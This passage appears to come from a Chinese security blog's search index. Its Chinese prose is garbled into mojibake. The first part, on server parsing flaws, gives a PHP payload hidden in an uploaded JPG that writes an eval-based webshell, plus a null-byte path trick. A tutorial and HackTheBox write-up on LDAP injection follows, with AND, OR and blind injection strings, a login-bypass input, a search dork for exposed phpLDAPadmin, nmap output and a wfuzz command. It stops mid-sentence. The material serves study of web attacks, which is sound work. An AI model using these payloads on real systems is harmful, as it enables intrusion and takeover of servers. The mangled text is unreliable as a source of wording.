www.xxxx.com&#x2F;UploadFiles&#x2F;image&#x2F;1.jpg&#x2F;%20\\0.php å¦å¤–ä¸€ç§æ‰‹æ³•ï¼šä¸Šä¼ ä¸€ä¸ªåå­—ä¸º test.jpgï¼Œä»¥ä¸‹å†…å®¹çš„æ–‡ä»¶: 1&lt;?PHP fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php eval($_POST[cmd])?&gt;&#x27;);?&gt; ç„¶åè®¿é—® test.jpg/.php, åœ¨è¿™ä¸ªç›®å½•ä¸‹å°±ä¼šç”Ÿæˆä¸€å¥è¯æœ¨é©¬ shell.phpã€‚ ç©ºå­—èŠ‚ä»£ç æ‰§è¡Œæ¼æ´ æ¶æ„ç”¨æˆ·å‘å‡ºè¯·æ±‚http://example.com/file.extï¼…00.phpå°±ä¼šå°† file.ext ä½œä¸º PHP æ–‡ä»¶è§£æã€‚","tags":[{"name":"Webå®‰å…¨å­¦ä¹ ","slug":"Webå®‰å…¨å­¦ä¹ ","permalink":"http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"},{"name":"æœåŠ¡å™¨è§£ææ¼æ´","slug":"æœåŠ¡å™¨è§£ææ¼æ´","permalink":"http://ca0y1h.top/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"}],"categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"åŸºç¡€å­¦ä¹ ","slug":"Webå®‰å…¨/åŸºç¡€å­¦ä¹ ","permalink":"http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"æµ…è°ˆLDAPæ³¨å…¥æ”»å‡»","date":"2020-08-18T13:02:44.000Z","path":"Web_security/basic_learning/24.æµ…è°ˆLDAPæ³¨å…¥æ”»å‡»/","text":"æ–‡ç« é¦–å‘äº å®‰å…¨å®¢ ä»HTBé¶æœºä¸­æµ…è°ˆLDAPæ³¨å…¥æ”»å‡» æœ€è¿‘åœ¨HackTheBoxä¸Šæ°ªäº†é‡‘ï¼ˆè‚‰ç–¼ğŸ˜­ï¼‰ï¼Œåšäº†ä¸€äº›å·²ç»retiredçš„é«˜è´¨é‡é¶æœºï¼Œä¸å¾—ä¸è¯´è´¨é‡è¿˜æ˜¯å¾ˆé«˜çš„ã€‚å…¶ä¸­æœ‰ä¸€ä¸ªé¶æœºå«åšCTFï¼Œéš¾åº¦æ˜¯æœ€é«˜çº§åˆ«çš„insaneï¼Œä¸»è¦æ˜¯å®ƒè€ƒå¯Ÿçš„çŸ¥è¯†ç‚¹æ¯”è¾ƒå†·é—¨â€”â€”LDAPæ³¨å…¥ã€‚å¯èƒ½å¾ˆå¤šå°ä¼™ä¼´éƒ½æ²¡æ€ä¹ˆå¬è¯´è¿‡è¿™ä¸ªæ¼æ´ï¼Œæˆ‘æƒ³ä¸»è¦åŸå› è¿˜æ˜¯LDAPè¿™ä¸ªåè®®ç”¨çš„æ¯”è¾ƒå°‘ï¼Œè€Œä¸”å›½å†…CTFæ¯”èµ›ä¸­æˆ‘ä¹ŸåŸºæœ¬ä¸Šæ²¡æœ‰çœ‹åˆ°æœ‰è€ƒå¯Ÿè¿™ä¸ªç‚¹çš„ã€‚åœ¨ç½‘ä¸Šæœäº†ä¸€ä¸‹ï¼Œå‘ç°æœ€è¿‘ä¸€æ¬¡å‡ºç°è¿™ä¸ªè€ƒç‚¹çš„æ˜¯åœ¨CSAW CTF Qualification Round 2018æ¯”èµ›ä¸­ï¼Œé¢˜ç›®ç›´æ¥å‘Šè¯‰ä½ äº†æ˜¯è€ƒLDAPæ³¨å…¥ã€‚åˆšå¥½ä¸Šä¸ªæ˜ŸæœŸæˆ‘åœ¨æ˜Ÿç›Ÿå†…éƒ¨åˆ†äº«ä¸­ï¼Œä¹Ÿæåˆ°äº†è¿™ä¸ªçŸ¥è¯†ç‚¹ï¼Œé‚£ä¹ˆæœ¬ç€èŠèƒœäºæ— ï¼Œå¼€é˜”çŸ¥è¯†é¢çš„æœ¬æ„ä¸‹ï¼ˆå…¶å®æ˜¯å·æ‡’ï¼Ÿï¼‰ï¼Œå†™ä¸‹è¿™ç¯‡æµ…è°ˆLDAPæ³¨å…¥æ”»å‡»çš„æ–‡ç« ã€‚ 0x01 LDAPä»‹ç» ä»€ä¹ˆæ˜¯LDAP åœ¨åšé¶æœºä¹‹å‰ï¼Œæˆ‘ä»¬é¦–å…ˆæ¥äº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯LDAPï¼Ÿ ä»¥ä¸‹å†…å®¹éƒ¨åˆ†æ‘˜è‡ª2018 blackhat LDAP Injection &amp; Blind LDAP Injection LDAP(Lightweight Directory Access Protocol):è½»é‡çº§ç›®å½•è®¿é—®åè®®ï¼Œæ˜¯ä¸€ç§åœ¨çº¿ç›®å½•è®¿é—®åè®®ï¼Œä¸»è¦ç”¨äºç›®å½•ä¸­èµ„æºçš„æœç´¢å’ŒæŸ¥è¯¢ï¼Œæ˜¯X.500çš„ä¸€ç§ç®€ä¾¿çš„å®ç°ã€‚ é‚£ä¹ˆè½¬æ¢æˆäººè¯å°±æ˜¯è¯´ï¼ŒLDAPæ˜¯ç”¨äºè®¿é—®ç›®å½•æœåŠ¡ï¼ˆç‰¹åˆ«æ˜¯åŸºäºX.500çš„ç›®å½•æœåŠ¡ï¼‰çš„è½»é‡çº§å®¢æˆ·ç«¯æœåŠ¡å™¨åè®®ï¼Œå®ƒé€šè¿‡TCP/IPä¼ è¾“æœåŠ¡è¿è¡Œã€‚å…³é”®çš„åœ°æ–¹å°±åœ¨äºï¼Œæ•°æ®æ˜¯å­˜å‚¨åœ¨ç›®å½•ä¸­ï¼Œè€Œä¸æ˜¯æ•°æ®åº“ä¸­ã€‚çš„ç¡®ï¼Œç›®å½•å’Œæ•°æ®åº“æœ‰å¾ˆå¤šå…±åŒä¹‹å¤„ï¼Œéƒ½èƒ½å­˜å‚¨æ•°æ®ã€å¹¶èƒ½åœ¨ä¸€å®šç¨‹åº¦è¿›è¡Œæœç´¢å’ŒæŸ¥è¯¢ã€‚è¿™é‡Œå°±æœ‰ä¸€ä¸ªé—®é¢˜äº†ï¼Œç›®å½•å’Œæ•°æ®åº“çš„åŒºåˆ«åœ¨å“ªï¼Ÿ æœ€é‡è¦çš„åŒºåˆ«å°±æ˜¯ç›®å½•é€‚åˆäºå­˜æ”¾é™æ€æ•°æ®ï¼Œå®ƒå­˜å‚¨çš„æ•°æ®æ— è®ºåœ¨ç±»å‹å’Œç§ç±»è¾ƒä¹‹æ•°æ®åº“ä¸­çš„æ•°æ®éƒ½è¦æ›´ä¸ºç¹å¤šï¼ŒåŒ…æ‹¬éŸ³é¢‘ã€è§†é¢‘ã€å¯æ‰§è¡Œæ–‡ä»¶ã€æ–‡æœ¬ç­‰æ–‡ä»¶ï¼Œå¦å¤–ç›®å½•ä¸­è¿˜å­˜åœ¨ç›®å½•çš„é€’å½’ã€‚æ—¢ç„¶æ˜¯å­˜æ”¾ä¸åŒç±»å‹çš„é™æ€æ•°æ®ï¼Œé‚£ä¹ˆç›®å½•æœåŠ¡åœ¨è¿›è¡Œä¼˜åŒ–åæ›´é€‚å®œäºè¯»è®¿é—®ï¼Œè€Œéå†™ã€ä¿®æ”¹ç­‰æ“ä½œã€‚ è¯´äº†è¿™ä¹ˆåŠå¤©ï¼Œæ„Ÿè§‰è¿˜æ˜¯è´´ä¸€å¼ å›¾æ¥çš„æ›´å¿«ã€‚ ä¸Šé¢è¿™å¼ å›¾å±•ç¤ºäº†LDAPçš„ç»“æ„ã€‚æˆ‘ä»¬éƒ½çŸ¥é“MySQLæ•°æ®åº“ä¸­çš„æ•°æ®éƒ½æ˜¯æŒ‰è®°å½•ä¸€æ¡æ¡è®°å½•å­˜åœ¨è¡¨ä¸­ï¼Œè€ŒLDAPæ˜¯æ ‘ç»“æ„çš„ï¼Œæ•°æ®å­˜å‚¨åœ¨å¶å­èŠ‚ç‚¹ä¸Šã€‚æ¯”å¦‚è¦æè¿°ä¸Šå›¾babyè¿™ä¸ªèŠ‚ç‚¹ï¼š 1cn&#x3D;baby, ou&#x3D;marketing, ou&#x3D;people, dc&#x3D;mydomain, dc&#x3D;org LDAPçš„åŸºæœ¬æ¦‚å¿µ åœ¨å¤§æ¦‚çŸ¥é“LDAPæ˜¯åšä»€ä¹ˆã€é•¿ä»€ä¹ˆæ ·ä¹‹åï¼Œæˆ‘ä»¬å†æ¥äº†è§£ä¸€ä¸‹LDAPçš„ä¸€äº›åŸºæœ¬æ¦‚å¿µï¼Œä¸»è¦æ˜¯ä¸‰ä¸ªä¸“æœ‰åè¯ï¼šæ¡ç›®ï¼ˆEntryï¼‰ã€å±æ€§ï¼ˆAttributeï¼‰ã€å¯¹è±¡ç±»ï¼ˆObjectClassï¼‰ã€‚ æ¡ç›® æ¡ç›®ï¼Œä¹Ÿå«è®°å½•é¡¹ï¼Œæ˜¯LDAPä¸­æœ€åŸºæœ¬çš„é¢—ç²’ï¼Œå°±æƒ³å­—å…¸ä¸­çš„è¯æ¡æˆ–è€…æ˜¯æ•°æ®ä¸­çš„è®°å½•ã€‚é€šå¸¸å¯¹LDAPçš„æ·»åŠ ã€åˆ é™¤ã€ä¿®æ”¹ã€æœç´¢éƒ½æ˜¯ä»¥æ¡ç›®ä¸ºåŸºæœ¬å•ä½ã€‚ å±æ€§ æ¯ä¸ªæ¡ç›®éƒ½å¯ä»¥æœ‰å¾ˆå¤šå±æ€§ï¼ˆAttributeï¼‰ï¼Œæ¯”å¦‚å¸¸è§çš„äººéƒ½æœ‰å§“åã€åœ°å€ã€ç”µè¯ç­‰å±æ€§ã€‚æ¯ä¸ªå±æ€§éƒ½æœ‰åç§°åŠå¯¹åº”çš„å€¼ï¼Œå±æ€§å€¼å¯ä»¥æœ‰å•ä¸ªã€å¤šä¸ªï¼Œæ¯”å¦‚ä½ æœ‰å¤šä¸ªé‚®ç®±ã€‚ æ­¤å¤–ï¼ŒLDAPä¸ºäººå‘˜ç»„ç»‡æœºæ„ä¸­å¸¸è§çš„å¯¹è±¡éƒ½è®¾è®¡äº†å±æ€§(æ¯”å¦‚commonNameï¼Œsurname)ã€‚ å¯¹è±¡ç±» å¯¹è±¡ç±»æ˜¯å±æ€§çš„é›†åˆï¼ŒLDAPé¢„æƒ³äº†å¾ˆå¤šäººå‘˜ç»„ç»‡æœºæ„ä¸­å¸¸è§çš„å¯¹è±¡ï¼Œå¹¶å°†å…¶å°è£…æˆå¯¹è±¡ç±»ã€‚æ¯”å¦‚äººå‘˜ï¼ˆpersonï¼‰å«æœ‰å§“ï¼ˆsnï¼‰ã€åï¼ˆcnï¼‰ã€ç”µè¯(telephoneNumber)ã€å¯†ç (userPassword)ç­‰å±æ€§ï¼Œå•ä½èŒå·¥(organizationalPerson)æ˜¯äººå‘˜(person)çš„ç»§æ‰¿ç±»ï¼Œé™¤äº†ä¸Šè¿°å±æ€§ä¹‹å¤–è¿˜å«æœ‰èŒåŠ¡ï¼ˆtitleï¼‰ã€é‚®æ”¿ç¼–ç ï¼ˆpostalCodeï¼‰ã€é€šä¿¡åœ°å€(postalAddress)ç­‰å±æ€§ã€‚ é€šè¿‡å¯¹è±¡ç±»å¯ä»¥æ–¹ä¾¿çš„å®šä¹‰æ¡ç›®ç±»å‹ã€‚æ¯ä¸ªæ¡ç›®å¯ä»¥ç›´æ¥ç»§æ‰¿å¤šä¸ªå¯¹è±¡ç±»ï¼Œè¿™æ ·å°±ç»§æ‰¿äº†å„ç§å±æ€§ã€‚å¦‚æœ2ä¸ªå¯¹è±¡ç±»ä¸­æœ‰ç›¸åŒçš„å±æ€§ï¼Œåˆ™æ¡ç›®ç»§æ‰¿ååªä¼šä¿ç•™1ä¸ªå±æ€§ã€‚å¯¹è±¡ç±»åŒæ—¶ä¹Ÿè§„å®šäº†å“ªäº›å±æ€§æ˜¯åŸºæœ¬ä¿¡æ¯ï¼Œå³å¿…è¦å±æ€§å’Œå¯é€‰å±æ€§ã€‚ æ˜¯ä¸æ˜¯å¬èµ·æ¥å’Œé¢å‘å¯¹è±¡è¯­è¨€æœ‰ç‚¹ç›¸ä¼¼ï¼Œè·ŸJavaä¸­çš„Objectç±»ä¸€æ ·ï¼ŒLDAPçš„æ ¹å¯¹è±¡ç±»å°±å«åštopã€‚ ä¸Šè¿°å°±æ˜¯ç¬”è€…å¯¹LDAPæ•°æ®ç»“æ„çš„ç®€å•ä»‹ç»äº†ï¼ŒLDAPæ—¢ç„¶ä¸»è¦ç”¨äºæœç´¢æŸ¥è¯¢ï¼Œé‚£å®ƒæ˜¯æ€ä¹ˆæŸ¥è¯¢çš„å‘¢ï¼Ÿ LDAPçš„åŸºæœ¬è¯­æ³• LDAPçš„è¯­æ³•éå¸¸ç®€å•ï¼Œä¸€çœ‹å°±ä¼šï¼Œå†çœ‹å°±æ‡‚ã€‚ ä»¥ä¸‹éƒ¨åˆ†å†…å®¹æ‘˜è‡ªhttps://blog.csdn.net/leader_ww/article/details/4028672 =ï¼ˆç­‰äºï¼‰ ä¾‹å¦‚ï¼Œå¦‚æœå¸Œæœ›æŸ¥æ‰¾å±æ€§giveNnameå€¼ä¸ºJohnçš„æ‰€æœ‰å¯¹è±¡ï¼Œå¯ä»¥ä½¿ç”¨(givenName=John)ã€‚è¿™ä¼šè¿”å›å¯¹åº”æ¡ä»¶çš„æ‰€æœ‰å¯¹è±¡ã€‚ &amp;ï¼ˆé€»è¾‘ä¸ï¼‰ ä¾‹å¦‚ï¼Œå¦‚æœå¸Œæœ›æŸ¥æ‰¾å±…ä½åœ¨ Dallas å¹¶ä¸”givenNameä¸ºJohnçš„æ‰€æœ‰å¯¹è±¡ï¼Œå¯ä»¥ä½¿ç”¨(&amp;(givenName=John)(l=Dallas))ã€‚ è¯·æ³¨æ„ï¼Œæ¯ä¸ªå‚æ•°éƒ½è¢«å±äºå…¶è‡ªå·±çš„åœ†æ‹¬å·æ‹¬èµ·æ¥ã€‚æ•´ä¸ª LDAP è¯­å¥å¿…é¡»åŒ…æ‹¬åœ¨ä¸€å¯¹ä¸»åœ†æ‹¬å·ä¸­ã€‚æ“ä½œç¬¦ &amp; è¡¨æ˜ï¼Œåªæœ‰æ¯ä¸ªå‚æ•°éƒ½ä¸ºçœŸï¼Œæ‰ä¼šå°†æ­¤ç­›é€‰æ¡ä»¶åº”ç”¨åˆ°è¦æŸ¥è¯¢çš„å¯¹è±¡ã€‚ |ï¼ˆé€»è¾‘æˆ–ï¼‰ ä¾‹å¦‚ï¼Œå¦‚æœå¸Œæœ›æŸ¥æ‰¾å±æ€§givenNameå€¼ä¸ºJhonæˆ–è€…Jackçš„æ‰€æœ‰å¯¹è±¡ï¼Œå¯ä»¥ä½¿ç”¨(|(givenName=Jhon)(givenName=Jack))ã€‚ !ï¼ˆé€»è¾‘éï¼‰ ä¾‹å¦‚ï¼Œå¦‚æœéœ€è¦æŸ¥æ‰¾givenNameä¸ºJohnçš„å¯¹è±¡ä»¥å¤–çš„æ‰€æœ‰å¯¹è±¡ã€‚åˆ™åº”ä½¿ç”¨å¦‚ä¸‹è¯­å¥ï¼š(!givenName=John) *ï¼ˆé€šé…ç¬¦ï¼‰ å¯ä½¿ç”¨é€šé…ç¬¦è¡¨ç¤ºå€¼å¯ä»¥ç­‰äºä»»ä½•å€¼ã€‚ä½¿ç”¨å®ƒçš„æƒ…å†µå¯èƒ½æ˜¯ï¼šæ‚¨å¸Œæœ›æŸ¥æ‰¾å…·æœ‰èŒåŠ¡å¤´è¡”çš„æ‰€æœ‰å¯¹è±¡ã€‚ä¸ºæ­¤ï¼Œå¯ä»¥ä½¿ç”¨(title=*)ï¼Œè¿™ä¼šè¿”å›titleå±æ€§åŒ…å«å†…å®¹çš„æ‰€æœ‰å¯¹è±¡ã€‚ å¦ä¸€ä¸ªä¾‹å­æ˜¯ï¼šæ‚¨çŸ¥é“æŸä¸ªå¯¹è±¡çš„givenNameå±æ€§çš„å¼€å¤´ä¸¤ä¸ªå­—æ¯æ˜¯â€œJoâ€ã€‚é‚£ä¹ˆï¼Œå¯ä»¥ä½¿ç”¨(givenName=Jo*)è¿›è¡ŒæŸ¥æ‰¾ï¼Œè¿™ä¼šè¿”å›givenNameä»¥Joå¼€å¤´çš„æ‰€æœ‰å¯¹è±¡ã€‚ Over~~LDAPçš„è¯­æ³•æ˜¯ä¸æ˜¯å¾ˆç®€å•ã€‚ è¯´äº†è¿™ä¹ˆå¤šï¼Œå¯èƒ½å¾ˆå¤šå°ä¼™ä¼´è¿˜æ˜¯å¿ƒå­˜ç–‘é—®ï¼Œå·²ç»éƒ¨ç½²æˆåŠŸçš„LDAPåˆ°åº•æ˜¯é•¿ä»€ä¹ˆæ ·å­ï¼Ÿ æˆ‘ä»¬å¯ä»¥é€šè¿‡Google Hacking intitle:â€phpLDAPadminâ€ inurl:cmd.phpæ¥æ£€ç´¢ä¸€ä¸‹ï¼ŒçœŸå®çš„è¿è¡Œçš„LDAPæœåŠ¡çš„ç½‘ç«™ï¼Œè¿™ä¸ªåœ°æ–¹æˆ‘å°±è´´ä¸€å¼ å›¾ç¤ºèŒƒä¸€ä¸‹ï¼ŒåŒ…å«äº†ä¸Šé¢æåˆ°çš„æ‰€æœ‰æ¦‚å¿µã€‚ 0x02 LDAPæ³¨å…¥æ”»å‡»é¢ å…¶å®å®ƒçš„æ”»å‡»æ‰‹æ³•å’ŒSQLæ³¨å…¥çš„åŸç†éå¸¸ç›¸ä¼¼ï¼Œåœ¨æœ‰æ¼æ´çš„ç¯å¢ƒä¸­ï¼Œè¿™äº›æŸ¥è¯¢å‚æ•°æ²¡æœ‰å¾—åˆ°åˆé€‚çš„è¿‡æ»¤ï¼Œå› è€Œæ”»å‡»è€…å¯ä»¥æ³¨å…¥ä»»æ„æ¶æ„ä»£ç ã€‚ç”±äºæ¯”è¾ƒç®€å•ï¼Œæˆ‘è¿™é‡Œå°±èµ°é©¬è§‚èŠ±çš„æ–¹å¼æ¥è¿‡ä¸€éLDAPæ³¨å…¥çš„ä¸åŒç±»å‹ã€‚ ä»¥ä¸‹éƒ¨åˆ†å†…å®¹æ‘˜è‡ªhttps://wooyun.js.org/drops/LDAP%E6%B3%A8%E5%85%A5%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%89%96%E6%9E%90.html ANDæ³¨å…¥ è¿™ç§æƒ…å†µï¼Œåº”ç”¨ä¼šæ„é€ ç”±â€&amp;â€æ“ä½œç¬¦å’Œç”¨æˆ·å¼•å…¥çš„çš„å‚æ•°ç»„æˆçš„æ­£å¸¸æŸ¥è¯¢åœ¨LDAPç›®å½•ä¸­æœç´¢ï¼Œä¾‹å¦‚ï¼š 1(&amp;(parameter1&#x3D;value1)(parameter2&#x3D;value2)) è¿™é‡ŒValue1å’Œvalue2æ˜¯åœ¨LDAPç›®å½•ä¸­æœç´¢çš„å€¼ï¼Œæ”»å‡»è€…å¯ä»¥æ³¨å…¥ä»£ç ï¼Œç»´æŒæ­£ç¡®çš„è¿‡æ»¤å™¨ç»“æ„ä½†èƒ½ä½¿ç”¨æŸ¥è¯¢å®ç°ä»–è‡ªå·±çš„ç›®æ ‡ã€‚ æ¯”å¦‚è¯´ï¼Œä¸ºäº†éªŒè¯å®¢æˆ·ç«¯æä¾›çš„user/passwordå¯¹ï¼Œæ„é€ å¦‚ä¸‹LDAPè¿‡æ»¤å™¨å¹¶å‘é€ç»™LDAPæœåŠ¡å™¨ï¼š 1(&amp;(USER&#x3D;Uname)(PASSWORD&#x3D;Pwd)) å¦‚æœæ”»å‡»è€…è¾“å…¥ä¸€ä¸ªæœ‰æ•ˆåœ°ç”¨æˆ·åï¼Œå¦‚r00tgrokï¼Œç„¶åå†è¿™ä¸ªåå­—åé¢æ³¨å…¥æ°å½“çš„è¯­å¥ï¼Œpasswordæ£€æŸ¥å°±ä¼šè¢«ç»•è¿‡ã€‚ ä½¿å¾—Uname=slisberger)(&amp;))ï¼Œå¼•å…¥ä»»ä½•å­—ç¬¦ä¸²ä½œä¸ºPwdå€¼ï¼Œæ„é€ å¦‚ä¸‹æŸ¥è¯¢å¹¶å‘é€ç»™æœåŠ¡å™¨ï¼š 1(&amp;(USER&#x3D; slisberger)(&amp;)(PASSWORD&#x3D;Pwd)) ORæ³¨å…¥ è¿™ç§æƒ…å†µï¼Œåº”ç”¨ä¼šæ„é€ ç”±â€|â€æ“ä½œç¬¦å’Œç”¨æˆ·å¼•å…¥çš„çš„å‚æ•°ç»„æˆçš„æ­£å¸¸æŸ¥è¯¢åœ¨LDAPç›®å½•ä¸­æœç´¢ï¼Œä¾‹å¦‚ï¼š 1(|(parameter1&#x3D;value1)(parameter2&#x3D;value2)) è¿™é‡ŒValue1å’Œvalue2æ˜¯åœ¨LDAPç›®å½•ä¸­æœç´¢çš„å€¼ï¼Œæ”»å‡»è€…å¯ä»¥æ³¨å…¥ä»£ç ï¼Œç»´æŒæ­£ç¡®çš„è¿‡æ»¤å™¨ç»“æ„ä½†èƒ½ä½¿ç”¨æŸ¥è¯¢å®ç°ä»–è‡ªå·±çš„ç›®æ ‡ã€‚ ç±»ä¼¼çš„ï¼ŒåŠ å…¥ç°åœ¨ç”¨äºå±•ç¤ºå¯ç”¨èµ„æºçš„æŸ¥è¯¢ä¸ºï¼š 1(|(type&#x3D;Rsc1)(type&#x3D;Rsc2)) Rsc1å’ŒRsc2è¡¨ç¤ºç³»ç»Ÿä¸­ä¸åŒç§ç±»çš„èµ„æºã€‚å¦‚æœæ”»å‡»è€…è¾“å…¥Rsc=printer)(uid=*)ï¼Œåˆ™ä¸‹é¢çš„æŸ¥è¯¢è¢«å‘é€ç»™æœåŠ¡å™¨ï¼š 1(|(type&#x3D;printer)(uid&#x3D;*))(type&#x3D;scanner) è¿™æ ·ä¹Ÿä¼šé€ æˆæ³¨å…¥çš„äº§ç”Ÿã€‚ ç›²æ³¨ SQLæ³¨å…¥ä¸­æœ‰ç›²æ³¨ï¼ŒLDAPä¸­ä¹Ÿå­˜åœ¨è¿™ç§é—®é¢˜ï¼ŒåŒ…æ‹¬ä¸‹é¢ä»‹ç»åˆ°çš„é¶æœºç”¨åˆ°çš„ä¹Ÿæ˜¯ç›²æ³¨çš„æ‰‹æ³•ã€‚ å‡è®¾æ”»å‡»è€…å¯ä»¥ä»æœåŠ¡å™¨å“åº”ä¸­æ¨æµ‹å‡ºä»€ä¹ˆï¼Œå°½ç®¡åº”ç”¨æ²¡æœ‰æŠ¥å‡ºé”™ä¿¡æ¯ï¼ŒLDAPè¿‡æ»¤å™¨ä¸­æ³¨å…¥çš„ä»£ç å´ç”Ÿæˆäº†æœ‰æ•ˆçš„å“åº”æˆ–é”™è¯¯ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€è¡Œä¸ºå‘æœåŠ¡å™¨é—®æ­£ç¡®çš„æˆ–é”™è¯¯çš„é—®é¢˜ã€‚ è¿˜æ˜¯ç”¨ä¸€ä¸ªä¾‹å­æ¥è¯´æ˜ã€‚ å‡è®¾ä¸€ä¸ªWebåº”ç”¨æƒ³ä»ä¸€ä¸ªLDAPç›®å½•åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„Epsonæ‰“å°æœºï¼Œé”™è¯¯ä¿¡æ¯ä¸ä¼šè¿”å›ï¼Œåº”ç”¨å‘é€å¦‚ä¸‹çš„è¿‡æ»¤å™¨ï¼š 1(&amp;(objectClass&#x3D;printer)(type&#x3D;Epson*)) ä½¿ç”¨è¿™ä¸ªæŸ¥è¯¢ï¼Œå¦‚æœæœ‰å¯ç”¨çš„Epsonæ‰“å°æœºï¼Œå…¶å›¾æ ‡å°±ä¼šæ˜¾ç¤ºç»™å®¢æˆ·ç«¯ï¼Œå¦åˆ™æ²¡æœ‰å›¾æ ‡å‡ºç°ã€‚å¦‚æœæ”»å‡»è€…è¿›è¡ŒLDAPç›²æ³¨å…¥æ”»å‡» 1*)(objectClass&#x3D;*))(&amp;(objectClass&#x3D;void Webåº”ç”¨ä¼šæ„é€ å¦‚ä¸‹æŸ¥è¯¢ï¼š 1(&amp;(objectClass&#x3D;*)(objectClass&#x3D;*))(&amp;(objectClass&#x3D;void)(type&#x3D;Epson*)) ä»…ç¬¬ä¸€ä¸ªLDAPè¿‡æ»¤å™¨ä¼šè¢«å¤„ç†ï¼š 1(&amp;(objectClass&#x3D;*)(objectClass&#x3D;*)) é‚£ä¹ˆè¿™æ ·å°±å’Œæˆ‘ä»¬æŸ¥è¯¢çš„åˆè¡·ç›¸è¿èƒŒäº†ã€‚ æ¥ä¸‹æ¥å°±æ˜¯è¿™ç¯‡æ–‡ç« çš„é‡å¤´æˆäº†ï¼Œæˆ‘ä»¬ä¸»è¦ä»è¿™ä¸ªé¶æœºä¸­å­¦åˆ°ä¸¤ç‚¹ï¼š æ€ä¹ˆå‘ç°LDAPæ³¨å…¥æ¼æ´ å¦‚ä½•åˆ©ç”¨LDAPæ³¨å…¥æ¼æ´ 0x03 ä»HTBé¶æœºä¸­å­¦ä¹ LDAPæ³¨å…¥ Initial Enunciation æ‹¿åˆ°é¶æœºå…ˆç”¨Nmapæ‰«ä¸€ä¸‹ç«¯å£ 123456789101112131415# Nmap 7.80 scan initiated Fri Jul 10 10:50:40 2020 as: nmap -sC -sV -oN ctf 10.10.10.122Nmap scan report for ctf.htb (10.10.10.122)Host is up (1.8s latency).Not shown: 998 filtered portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.4 (protocol 2.0)| ssh-hostkey:| 2048 fd:ad:f7:cb:dc:42:1e:43:7d:b3:d5:8b:ce:63:b9:0e (RSA)| 256 3d:ef:34:5c:e5:17:5e:06:d7:a4:c8:86:ca:e2:df:fb (ECDSA)|_ 256 4c:46:e2:16:8a:14:f6:f0:aa:39:6c:97:46:db:b4:40 (ED25519)80&#x2F;tcp open http Apache httpd 2.4.6 ((CentOS) OpenSSL&#x2F;1.0.2k-fips mod_fcgid&#x2F;2.3.9 PHP&#x2F;5.4.16)|_http-server-header: Apache&#x2F;2.4.6 (CentOS) OpenSSL&#x2F;1.0.2k-fips mod_fcgid&#x2F;2.3.9 PHP&#x2F;5.4.16Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .# Nmap done at Fri Jul 10 11:03:44 2020 -- 1 IP address (1 host up) scanned in 783.74 seconds æŸ¥çœ‹80ç«¯å£ å¤§æ¦‚çš„æ„æ€å°±æ˜¯è®©æˆ‘ä»¬å°è¯•å»ç™»å½•è¿™ä¸ªç³»ç»Ÿï¼Œä½†æ˜¯ä¸èƒ½ç”¨SQLmapæˆ–è€…Dirbusterå»æš´åŠ›çŒœè§£ç”¨æˆ·åå’Œå¯†ç ã€‚ å†å»ç™»å½•ç•Œé¢çœ‹ä¸€ä¸‹ï¼š æç¤ºæˆ‘ä»¬æ˜¯ä¸€ä¸ªOTPï¼Œå³One Time Passwordï¼Œä¸€èˆ¬è€Œè¨€æ˜¯1åˆ†é’Ÿæ›´æ–°ä¸€æ¬¡ã€‚ æŸ¥çœ‹æºç ï¼Œå‘ç°æœ‰ä¸€ä¸ªHint å¦‚æœæ¯”è¾ƒç†Ÿæ‚‰LDAPçš„è¯ï¼Œè¿™é‡Œçš„ä¸¤ä¸ªåè¯schemaå’Œexisting attributeå·²ç»æç¤ºäº†æ˜¯å…³äºLDAPæ³¨å…¥ã€‚ ä½œè€…ç”¨ä¸€ä¸ªå·²çŸ¥çš„å±æ€§å»å­˜å‚¨äº†81ä½çš„token stringï¼ŒGoogleæœä¸€ä¸‹token string (81 digits)ã€‚ https://www.systutorials.com/docs/linux/man/1-stoken/ å¯ä»¥çœ‹åˆ°ä¸€ä¸ªå…³é”®çš„åœ°æ–¹ï¼ŒPure numeric (81-digit) &quot;ctf&quot; (compressed token format) stringsï¼Œå’Œé¶æœºçš„é¢˜ç›®ç›¸å¥‘åˆï¼Œç°åœ¨å°±æœ‰ä¸€ç‚¹æ€è·¯äº†ï¼Œåº”è¯¥è¦å»æ‰¾åˆ°è¿™ä¸ª81ä½çº¯æ•°å­—çš„tokenï¼Œç„¶åç”¨stokenå·¥å…·å»ç”ŸæˆOTPã€‚é‚£ä¹ˆä¸»è¦æ˜¯æ‰¾åˆ°tokenï¼Œå”¯ä¸€å¯ä»¥åˆ©ç”¨çš„å°±æ˜¯è¿™ä¸ªç™»å½•æ¡†äº†ã€‚ å…ˆéšä¾¿ç”¨æŸä¸ªç”¨æˆ·åå’Œå¯†ç ç™»å½•admin:1234 è¿”å›User admin not foundï¼Œå†ç”¨SQLæ³¨å…¥çš„ä¸‡èƒ½å¯†ç è¯•ä¸€è¯• ç›´æ¥æ˜¯æ²¡æœ‰ä»»ä½•æ˜¾ç¤ºï¼Œåº”è¯¥æ˜¯å¯¹ä¸€äº›ç‰¹æ®Šå­—ç¬¦æœ‰é»‘åå•è¿‡æ»¤ã€‚Fuzzä¸€ä¸‹è¿‡æ»¤äº†ä¸€äº›ä»€ä¹ˆå­—ç¬¦ 1wfuzz -c --hw 233 -d &#39;inputUsername&#x3D;FUZZ&amp;inputOTP&#x3D;1234&#39; -w special-chars.txt 10.10.10.122&#x2F;login.php â€“hw 233 ä»£è¡¨è¿‡æ»¤æ‰å½¢å¦‚User xxx not foundçš„è¿”å›ä¿¡æ¯ã€‚ æˆ‘ä»¬å‘ç°+å’Œ&amp;è¿”å›çš„æ˜¯232 